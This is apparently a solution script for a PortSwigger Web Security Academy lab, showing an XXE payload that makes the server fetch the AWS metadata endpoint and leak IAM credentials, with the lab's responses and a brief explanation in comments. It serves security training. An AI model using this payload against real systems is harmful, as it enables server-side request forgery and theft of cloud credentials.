# https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
import requests

requests.packages.urllib3.disable_warnings()

scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
verify = False
host = "acca1fcc1eea499c8039112c00250004.web-security-academy.net"
path = "/product/stock"
url = scheme + host + path
cookies = {"session": "nEBi2tZOmxzEYUx08ZVUrYtXMWdy5NZ3"}

path_from_response = "latest/meta-data/iam/security-credentials/admin"
payload_xxe_declaration = f"<!DOCTYPE test [ <!ENTITY test_xxe SYSTEM \"http://169.254.169.254/{path_from_response}\"> ]>"
payload_xxe_reference = "&test_xxe;"
data = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?>{payload_xxe_declaration}<stockCheck><productId>{payload_xxe_reference}</productId><storeId>1</storeId></stockCheck>"
requests.post(url, cookies=cookies, data=data, proxies=proxies, verify=verify)

# "Invalid product ID: latest"
# "Invalid product ID: meta-data"
# "Invalid product ID: iam"
# "Invalid product ID: security-credentials"
# "Invalid product ID: admin"
# "Invalid product ID: {
#   "Code" : "Success",
#   "LastUpdated" : "2021-04-19T19:38:09.396057Z",
#   "Type" : "AWS-HMAC",
#   "AccessKeyId" : "cYLhA70ArQD81ewBwfwa",
#   "SecretAccessKey" : "J4JFXVMGTBPcFMFlI7YIyC8z8Pcl5zGlwjTNAhOp",
#   "Token" : "6jUKcgSlgwEnvuTolKDvK6WvpDYNQtYKiMtq1rHtGVAnPr9ySCmwehRFoAVnmVQcCiFNphmAyvb1IACSoHWDk55U4Bg1Almc8O94hJ4Vm5zao90szir3k0mHORzht7GLr2LmFBv7oRVrI8WcC7NR03deYdFb1S2mLVzMbMoup7HG2tQlVSIEhkGOK8L5dT5aOsKU96HLMJwrKc9Qnnuaz2gISeb3OaIx3zMdypVuHgchQUxKom8huo941TF2xP83",
#   "Expiration" : "2027-04-18T19:38:09.396057Z"
# }"

# The server parses the xml and uses the product id value to query the stock checker api. By embedding an external entity, and then subsequently referencing it, we caused the server to parse the xml and query the internal ip address. The response contained a path (not sure why?) that gave the path to the sensitive data on the AWS metadata service.